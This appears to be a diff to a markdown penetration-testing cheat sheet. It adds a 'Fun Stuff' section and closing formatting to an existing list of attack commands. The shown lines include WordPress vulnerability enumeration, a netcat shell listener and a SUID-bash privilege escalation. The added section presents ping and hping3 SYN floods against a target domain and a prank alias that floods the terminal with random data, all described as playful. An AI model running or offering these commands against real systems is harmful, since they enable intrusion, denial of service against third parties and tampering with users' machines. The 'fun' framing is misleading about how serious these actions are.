@@ -25,13 +25,22 @@ wpscan --url domain.com --enumerate vp,vt --plugins-detection
 nc -lvnp 1234
 sudo chmod +s /bin/bash
 bash -p
+```
+
+---
 
 ## Fun Stuff
 
+Miscellaneous commands for playful or experimental purposes.
 
+```bash
 ping -s 1300 -f domain.com
 hping3 -S -V --flood domain.com
 hping3 --traceroute -V -1 domain.com
 cat /dev/urandom
 alias ls="cat /dev/urandom"
+```
 
+---
+
+**Note**: Replace `domain.com` with the target domain and ensure you have authorization to perform these actions. Some commands require root privileges or specific tools installed.
